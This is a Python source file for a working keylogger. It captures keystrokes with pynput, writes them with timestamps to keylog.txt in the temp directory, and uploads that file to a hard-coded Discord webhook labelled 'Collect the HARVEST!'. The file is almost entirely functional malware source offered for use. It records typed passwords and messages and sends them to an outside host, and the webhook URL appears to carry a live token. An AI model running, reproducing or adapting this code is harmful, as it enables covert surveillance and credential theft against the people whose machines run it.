from pynput.keyboard import Listener, Key
import os
import tempfile
from datetime import datetime
import requests;

# Get the path to the temp directory
temp_path = tempfile.gettempdir()
log_file = os.path.join(temp_path, "keylog.txt")  # Path to the keylog.txt file in the temp folder

def send_harvest():
    webhook_url = 'https://discord.com/api/webhooks/1378712011071950858/ZjwkRn7PvLt6AmCK0yI0Ds3GP7xvlQX-jo7BIZTBIqRq_9St5MUzfVGGTInWmjt8FfTG'

    if (os.path.exists(log_file)):
        with open(log_file, 'rb') as f:
            payload = {
                "content": "Collect the HARVEST!"
            }
            files = {
                "file": (os.path.basename(log_file), f)
            }
            response = requests.post(webhook_url, data=payload, files=files)
    else:
        print(f"File does not exist: {log_file}")

# Modifier keys to ignore
ignored_keys = {
    Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r,
    Key.alt, Key.alt_r, Key.caps_lock, Key.tab,
    Key.cmd, Key.cmd_r, Key.insert
}

# Insert formatted timestamp at the beginning
def write_header():
    now = datetime.now()
    time_str = now.strftime("%I:%M:%S %p")
    date_str = now.strftime("%-m/%-d/%Y") if os.name != "nt" else now.strftime("%#m/%#d/%Y")  # Cross-platform formatting
    day_str = now.strftime("%A")
    
    header_line = f"{time_str} | {date_str} | {day_str}"
    
    with open(log_file, "a", encoding="utf-8") as file:
        file.write("\n\n")
        file.write("-" * 50 + "\n")
        file.write(header_line + "\n")
        file.write("-" * 50 + "\n\n")


# Keep track of line length
char_count = 0

# Define a function to log the keys
def on_press(key):
    global char_count

    # Ignore specific modifier keys
    if key in ignored_keys:
        return

    try:
        if key == Key.space:
            char = ' '
        elif key == Key.enter:
            char = '\n'
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            char = ''
    except Exception:
        char = ''

    if char:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(char)
            char_count += len(char)
            if char_count >= 100:
                file.write("\n")
                char_count = 0

# Function to start the listener
def start_logging():
    write_header()  # Write date/time at start
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print(f"Keylogger is now running. All data will be saved to {log_file}")
    send_harvest()
    start_logging()